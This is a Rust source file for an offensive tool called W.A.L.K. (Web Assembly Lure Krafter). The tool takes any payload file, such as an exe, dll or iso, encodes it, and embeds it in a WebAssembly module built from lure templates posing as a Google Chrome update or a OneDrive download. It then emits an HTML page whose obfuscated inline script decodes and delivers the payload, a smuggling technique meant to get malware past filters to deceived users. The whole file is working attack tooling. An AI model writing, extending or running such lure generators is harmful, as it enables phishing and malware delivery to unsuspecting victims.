use colored::*;
use rand::{distributions::Alphanumeric, Rng, thread_rng};
use std::fs::{self, File};
use std::io::{self, Write};
use std::path::Path;
use std::process::Command;
use chrono::Utc;
use regex::Regex;
use base64;
use std::io::Read;

fn generate_lure(lure_type: &str, payload_format: &str, file_path: &str, payload_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    println!("{}", format!("[*] Generating lure of type: {}", lure_type).yellow());

    // Read the file and encode its contents to base64
    let mut file_content = Vec::new();
    File::open(file_path)?.read_to_end(&mut file_content)?;
    let payload_base64 = base64::encode(file_content);

    let results_dir = Path::new("./results");
    let random_folder = format!(
        "{}_{}",
        Utc::now().format("%Y%m%d_%H%M%S"),
        thread_rng()
            .sample_iter(Alphanumeric)
            .take(10)
            .map(char::from)
            .collect::<String>()
    );
    let target_dir = results_dir.join(&random_folder);
    fs::create_dir_all(&target_dir)?;

    let src_dir = target_dir.join("src");
    fs::create_dir_all(&src_dir)?;
    let _index_html = File::create(target_dir.join("index.html"))?;
    let mut cargo_toml = File::create(target_dir.join("Cargo.toml"))?;
    let mut lib_rs = File::create(src_dir.join("lib.rs"))?;
    let mut utils_rs = File::create(src_dir.join("utils.rs"))?;

    let template_path = format!("./lure_templates/{}.rs", lure_type.to_lowercase().replace(" ", "_"));
    let mut template_content = fs::read_to_string(&template_path)?;

    template_content = template_content.replace("{{ PAYLOAD }}", &payload_base64);
    template_content = template_content.replace("_x64.zip", &format!("_x64.{}", payload_format));

    let re = Regex::new(r#"google-chrome-update_x64"#).unwrap();
    template_content = re.replace(&template_content, payload_name).to_string();

    writeln!(lib_rs, "{}", template_content)?;

    let setup_cargo_toml_content = fs::read_to_string("./lure_setup/Cargo.toml")?;
    writeln!(cargo_toml, "{}", setup_cargo_toml_content)?;

    writeln!(utils_rs, "pub fn set_panic_hook() {{\n    #[cfg(feature = \"console_error_panic_hook\")]\n    console_error_panic_hook::set_once();\n}}")?;

    let output = Command::new("wasm-pack")
        .arg("build")
        .arg("--target")
        .arg("web")
        .current_dir(&target_dir)
        .output()?;
    
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(format!("Failed to compile lure: {}", stderr).into());
    }

    modify_wasm_smuggling_json(&target_dir)?;

    let wasm_smuggle_path = target_dir.join("pkg/wasm_smuggle.js");
    let mut wasm_smuggle_file = File::open(&wasm_smuggle_path)?;
    let mut wasm_smuggle_content = Vec::new();
    wasm_smuggle_file.read_to_end(&mut wasm_smuggle_content)?;
    let wasm_smuggle_base64 = base64::encode(&wasm_smuggle_content);

    // Modify index.html content with base64 encoded JS
    let html_content = format!(r#"
    <html>
    <head>
    <meta content="text/html;charset=utf-8" http-equiv="Content-Type" />
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">

    </head>
    <body>
    <script type="module">
        const renboad = "{}"
        const blob = new Blob([window['at' + 'ob'](renboad)], {{ type: 'application/javascript' }});
        import(URL['create' + 'Object' + 'URL'](blob)).then((module) => {{
        module.default();
        }})
    </script>
    </body>
    </html>
    "#, wasm_smuggle_base64);

    let html_path = target_dir.join("index.html");
    fs::write(html_path, html_content)?;

    Ok(())
}


fn modify_wasm_smuggling_json(target_dir: &Path) -> Result<(), io::Error> {
    let json_path = target_dir.join("pkg/wasm_smuggle.js");
    let wasm_file_path = target_dir.join("pkg/wasm_smuggle_bg.wasm");
    
    if !json_path.exists() {
        eprintln!("[-] wasm_smuggle.js not found. Ensure wasm-pack build was successful.");
        return Err(io::Error::new(io::ErrorKind::NotFound, "wasm_smuggle.js not found"));
    }

    // Read and encode WASM file
    let wasm_contents = fs::read(wasm_file_path)?;
    let wasm_base64 = base64::encode(&wasm_contents);

    // Read the original JS file
    let mut content = fs::read_to_string(&json_path)?;

    // Use regex for replacing `__wbg_load` function accurately
    let load_function_pattern = Regex::new(r"async function __wbg_load\(module, imports\) \{[\s\S]*?\n\}").unwrap();
    let new_load_function = r#"async function __wbg_load(module, imports) {
        const instance = await WebAssembly.instantiate(module, imports);
        if (instance instanceof WebAssembly.Instance) {
            return { instance, module };
        } else {
            return instance;
        }
    }"#;
    content = load_function_pattern.replace(&content, new_load_function).to_string();

    // Preparing the new __wbg_init function with the Base64-encoded WASM content
    let re_init = Regex::new(r"async function __wbg_init\(input\) \{[\s\S]*?\n\}").unwrap();
    let new_init_function = format!(r#"async function __wbg_init(input) {{
        if (wasm !== undefined) return wasm;
        const imports = __wbg_get_imports();
        const wasm_base64 = "{}";
        input = Uint8Array.from(atob(wasm_base64), c => c.charCodeAt(0)).buffer;
        __wbg_init_memory(imports);
        const {{ instance, module }} = await __wbg_load(input, imports);
        return __wbg_finalize_init(instance, module);
    }}"#, wasm_base64);
    content = re_init.replace(&content, &new_init_function).to_string();

    fs::write(json_path, content)?;

    Ok(())
}

fn main() {
    println!("{}",
        "\n⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿\n\
         ⣿⣿⣿⡟⠀⠀⠀⠀⠠⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠄⠀⠀⠀⠀⢻⣿⣿⣿\n\
         ⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿\n\
         ⣿⣿⡇⠀⠀⠀⠀⠀⠀⢀⣮⣿⣿⣿⣿⣿⣿⣿⣿⣵⡀⠀⠀⠀⠀⠀⠀⢸⣿⣿\n\
         ⣿⣿⡀⠀⠀⠀⠀⢀⣴⣿⣯⡛⠋⠁⢻⡟⠈⠙⢛⣽⣿⣦⡀⠀⠀⠀⠀⢀⣿⣿\n\
         ⣿⣿⡇⠀⠀⠀⢾⣿⠟⠋⠁⠀o⠀⠀⠀o⠀⠀⠈⠙⠻⣿⡷⠀⠀⠀⢸⣿⣿\n\
         ⠛⠛⣷⡀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⢀⣾⠛⠛\n\
         ⡀⠀⠈⠻⣶⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣶⠟⠁⠀⢀\n\
         ⣷⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣾\n\
         ⠛⠛⠛⠶⠶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⠶⠛⠛⠛\n\
         ⣆⡀⠀⠀⠀⠀⢀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡀⠀⠀⠀⠀⢀⣰\n\
         ⣿⣿⡿⠶⠚⠉⠀⠀⢀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡀⠀⠀⠉⠓⠶⢿⣿⣿\n\
         ⣿⠋⠀⠀⠀⠀⣠⡴⠋⠀⠀⣠⣶⣶⣶⣶⣶⣶⣄⠀⠀⠙⢦⣄⠀⠀⠀⠀⠙⣿\n\
         ⣿⣿⣷⣾⣿⣿⣿⡇⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⢸⣿⣿⣿⣷⣾⣿⣿\n\
         ⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿\nW.A.L.K.\nWeb Assembly Lure Krafter".truecolor(255, 165, 0)
    );
    println!("{}","by fr4nk\n".green());
    let lure_types = vec![
        "Google Chrome Update".truecolor(200, 155, 0),
        "One Drive File Download".truecolor(200, 155, 0),
        "Sample".truecolor(200, 155, 0)
        //
        // it is possible to add more lures in lure_templates folder and this menu
        // once  you do add a file, just add an entry to this menu
        // the menu entry will search for the equivalent file but following this logic:
        // Menu Entry: "New Lure"
        // W.A.L.K. will then look for "new_lure.rs" file in lure_templates
        //
        //"[Work In Progress] Google Drive File Download".red(),
        //"[Work In Progress] Join Zoom Meeting".red()
    ];

    let selection = dialoguer::Select::new()
        .with_prompt("[!] Select the lure to generate".blue().to_string())
        .default(0)
        .items(&lure_types)
        .interact()
        .unwrap();

    let payload_format = dialoguer::Input::<String>::new()
        .with_prompt("[!] Enter the format of the payload to smuggle (e.g., exe, dll, doc, pdf, zip, iso)".blue().to_string())
        .interact()
        .unwrap();

    let file_path = dialoguer::Input::<String>::new()
        .with_prompt("[!] Enter the absolute file path of the payload to smuggle".blue().to_string())
        .interact()
        .unwrap();

    let payload_name = dialoguer::Input::<String>::new()
        .with_prompt("[!] Enter the payload name".blue().to_string())
        .interact()
        .unwrap();

    match generate_lure(&lure_types[selection], &payload_format, &file_path, &payload_name) {
        Ok(()) => println!("{}", "[+] Lure generated successfully.".green()),
        Err(e) => println!("{}", format!("[-] {}", e).red()),
    }
}